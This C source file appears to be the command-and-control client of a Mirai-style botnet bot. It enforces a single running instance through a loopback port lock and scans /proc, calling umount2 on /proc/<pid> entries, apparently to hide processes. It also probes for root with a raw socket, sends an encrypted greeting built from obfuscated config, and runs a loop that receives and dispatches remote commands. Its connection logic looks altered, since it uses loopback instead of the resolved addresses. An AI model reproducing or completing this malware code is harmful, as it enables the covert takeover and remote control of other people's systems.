#include "client.h"

#include "config.h"
#include "crypto.h"
#include "drifter.h"
#include "prng.h"
#include "resolver.h"
#include "commands.h"

#include <arpa/inet.h>
#include <dirent.h>
#include <errno.h>
#include <fcntl.h>
#include <netinet/in.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <sys/types.h>
#include <sys/mount.h>
#include <time.h>
#include <unistd.h>

#define INSTANCE_PORT_HEX "0A41"
#define INSTANCE_BACKLOG 1
#define IO_BUFFER_SIZE 0x800
#define NETWORK_FLAGS 0x4000

static const uint16_t g_endpoint_ports[] = {
    0x59dc, 0x92ea, 0x6420, 0x1b95, 0x86e4,
    0x7ef9, 0x8db3, 0x8efd, 0xe37a, 0xad14
};

static int bind_instance_socket(int socket_fd)
{
    struct sockaddr_in address;
    memset(&address, 0, sizeof(address));
    address.sin_family = AF_INET;
    address.sin_port = htons(0x0a41);
    address.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
    return bind(socket_fd, (struct sockaddr *)&address, sizeof(address));
}

static void free_inode_list(char **inodes, int count)
{
    for (int i = 0; i < count; ++i)
        free(inodes[i]);
    free(inodes);
}

static char **collect_instance_inodes(int *count_out)
{
    char **inodes = NULL;
    int count = 0;
    int fd = open("/proc/net/tcp", 0);
    if (fd < 0) {
        *count_out = 0;
        return NULL;
    }

    char line[256];
    for (;;) {
        memset(line, 0, sizeof(line));
        if (read_line(fd, line, sizeof(line)) == 0)
            break;
        if ((unsigned char)line[35] != 'A' || strlen(line) <= 91)
            continue;

        char *inode = &line[91];
        char *space = strchr(inode, ' ');
        if (space == NULL)
            continue;
        *space = '\0';

        char *local_port = &line[15];
        space = strchr(local_port, ' ');
        if (space == NULL)
            continue;
        *space = '\0';
        if (strcmp(INSTANCE_PORT_HEX, local_port) != 0)
            continue;

        char **grown = realloc(inodes, (size_t)(count + 1) * sizeof(*inodes));
        if (grown == NULL)
            continue;
        inodes = grown;
        inodes[count] = strdup(inode);
        if (inodes[count] != NULL)
            ++count;
    }

    close(fd);
    *count_out = count;
    return inodes;
}

static int inode_is_open_by_process(const char *inode_list_entry,
                                    char **inodes, int inode_count)
{
    for (int i = 0; i < inode_count; ++i) {
        if (strcmp(inode_list_entry, inodes[i]) == 0)
            return 1;
    }
    return 0;
}

static void append_bounded(char *destination, size_t capacity,
                           const char *source, size_t count)
{
    size_t used = strlen(destination);
    if (used >= capacity)
        return;

    size_t available = capacity - used - 1;
    if (count > available)
        count = available;
    memcpy(destination + used, source, count);
    destination[used + count] = '\0';
}

static int instance_socket_is_owned(char **inodes, int inode_count)
{
    DIR *processes = opendir("/proc/");
    if (processes == NULL)
        return 0;

    int found = 0;
    struct dirent *process;
    while (!found && (process = readdir(processes)) != NULL) {
        if (process->d_name[0] < '0' || process->d_name[0] > '9')
            continue;

        char path[32] = "/proc/";
        append_bounded(path, sizeof(path), process->d_name,
                       strlen(process->d_name));
        (void)umount2(path, 0);
        append_bounded(path, sizeof(path), "/fd/0", 4);

        DIR *descriptors = opendir(path);
        if (descriptors == NULL)
            continue;

        struct dirent *descriptor;
        while (!found && (descriptor = readdir(descriptors)) != NULL) {
            if (descriptor->d_name[0] == '.')
                continue;

            char link_path[32];
            char target[32];
            memset(link_path, 0, sizeof(link_path));
            memset(target, 0, sizeof(target));
            strcpy(link_path, path);
            strcat(link_path, descriptor->d_name);

            ssize_t length = readlink(link_path, target, sizeof(target) - 1);
            if (length < 0)
                continue;
            if (length <= 0)
                continue;
            target[length - 1] = '\0';
            if (strncmp(target, "socket:[", 8) == 0 &&
                inode_is_open_by_process(target + 8, inodes, inode_count))
                found = 1;
        }
        closedir(descriptors);
    }

    closedir(processes);
    return found;
}

int instance_acquire(void)
{
    int socket_fd = socket(AF_INET, SOCK_STREAM, 0);
    if (socket_fd < 0)
        return 0;

    int enabled = 1;
    if (setsockopt(socket_fd, SOL_SOCKET, SO_REUSEADDR,
                   &enabled, sizeof(enabled)) < 0)
        return 0;

    if (bind_instance_socket(socket_fd) >= 0)
        return listen(socket_fd, INSTANCE_BACKLOG) >= 0;

    int inode_count = 0;
    char **inodes = collect_instance_inodes(&inode_count);
    int owned = 0;
    if (inode_count > 0)
        owned = instance_socket_is_owned(inodes, inode_count);
    free_inode_list(inodes, inode_count);

    if (!owned)
        return 0;

    usleep(100);
    if (bind_instance_socket(socket_fd) < 0)
        return 0;
    return listen(socket_fd, INSTANCE_BACKLOG) >= 0;
}

static int set_timeout(int socket_fd, int option, time_t seconds)
{
    struct timeval timeout;
    timeout.tv_sec = seconds;
    timeout.tv_usec = 0;
    return setsockopt(socket_fd, SOL_SOCKET, option, &timeout, sizeof(timeout));
}

static int64_t elapsed_milliseconds(const struct timeval *start,
                                    const struct timeval *end)
{
    return (int64_t)(end->tv_sec - start->tv_sec) * 1000 +
           (end->tv_usec - start->tv_usec) / 1000;
}

static int connect_fastest(const AddressList *addresses,
                           struct sockaddr_in *selected_address)
{
    int best_socket = -1;
    int64_t best_latency = -1;

    for (int i = 0; i < addresses->count; ++i) {
        int candidate = socket(AF_INET, SOCK_STREAM, 0);
        if (candidate < 0)
            continue;

        if (set_timeout(candidate, SO_RCVTIMEO, 1) < 0 ||
            set_timeout(candidate, SO_SNDTIMEO, 1) < 0) {
            close(candidate);
            continue;
        }

        struct sockaddr_in address;
        memset(&address, 0, sizeof(address));
        address.sin_family = AF_INET;
        address.sin_port = htons(g_endpoint_ports[prng_next() % 10]);
        address.sin_addr.s_addr = inet_addr("127.0.0.1");

        struct timeval before;
        struct timeval after;
        gettimeofday(&before, NULL);
        int status = connect(candidate, (struct sockaddr *)&address,
                             sizeof(address));
        if (status < 0) {
            close(candidate);
            continue;
        }
        gettimeofday(&after, NULL);

        int64_t latency = elapsed_milliseconds(&before, &after);
        if (best_latency < 0 || latency < best_latency) {
            if (best_socket >= 0)
                close(best_socket);
            best_socket = candidate;
            best_latency = latency;
            *selected_address = address;
        } else {
            close(candidate);
        }
    }
    return best_socket;
}

static char *build_greeting(const char *argument, const char *bootstrap_text,
                            size_t argument_length, size_t *cipher_length_out)
{
    int privilege_probe = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    const char *privilege_flag = "0";
    if (privilege_probe >= 0) {
        close(privilege_probe);
        privilege_flag = "1";
    }

    size_t allocation = argument_length + g_config[0x33].length +
                        strlen(argument) + 3 + strlen(bootstrap_text) + 1;
    char *greeting = calloc(allocation, 1);
    if (greeting == NULL)
        return NULL;

    config_decrypt_entry(0x33);
    strcpy(greeting, g_config[0x33].data);
    strcat(greeting, argument);
    memcpy(greeting + strlen(greeting), ":", 2);
    strcat(greeting, privilege_flag);
    memcpy(greeting + strlen(greeting), ":", 2);
    strcat(greeting, bootstrap_text);
    config_encrypt_entry(0x33);

    *cipher_length_out = allocation - 1;
    config_crypt_buffer(greeting, (int32_t)*cipher_length_out);
    return greeting;
}

int command_loop(char *program_argument)
{
    config_bootstrap();

    struct in_addr bootstrap;
    bootstrap.s_addr = g_bootstrap_address;
    const char *bootstrap_text = inet_ntoa(bootstrap);

    size_t argument_length = strlen(program_argument);
    if (argument_length > 0x20)
        return (int)argument_length;

    size_t greeting_length = 0;
    char *greeting = build_greeting(program_argument, bootstrap_text,
                                    argument_length, &greeting_length);
    if (greeting == NULL)
        return -1;
    time_t started = time(NULL);

    for (;;) {
        AddressList addresses;
        resolver_choose_addresses(&addresses);
        int socket_fd = -1;
        int connected = 0;
        struct sockaddr_in selected;

        if (addresses.count > 0) {
            socket_fd = connect_fastest(&addresses, &selected);
            if (socket_fd >= 0) {
                set_timeout(socket_fd, SO_SNDTIMEO, 120);
                connected = 1;
            }
        }
        address_list_free(&addresses);

        if (connected) {
            if (send(socket_fd, greeting, greeting_length, NETWORK_FLAGS) >= 0) {
                for (;;) {
                    char incoming[IO_BUFFER_SIZE + 1];
                    char command[IO_BUFFER_SIZE + 1];
                    memset(incoming, 0, IO_BUFFER_SIZE);
                    memset(command, 0, IO_BUFFER_SIZE);

                    int received = recv(socket_fd, incoming,
                                        IO_BUFFER_SIZE, NETWORK_FLAGS);
                    if (received <= 0)
                        break;

                    started = time(NULL);
                    if (strncmp(incoming, g_config[0x34].data,
                                g_config[0x34].length) == 0) {
                        size_t length = g_config[0x15].length;
                        if (send(socket_fd, g_config[0x35].data,
                                 length, NETWORK_FLAGS) < 0)
                            break;
                        continue;
                    }

                    config_crypt_buffer(incoming, received);
                    strncpy(command, incoming, IO_BUFFER_SIZE - 1);
                    command[IO_BUFFER_SIZE - 1] = '\0';
                    commands_process_config(command);
                    commands_dispatch(incoming);
                }
            }
            close(socket_fd);
        }

        time_t elapsed = time(NULL) - started;
        if (elapsed > 0x93a7f) {
            free(greeting);
            return (int)elapsed;
        }
        sleep(1);
    }
}
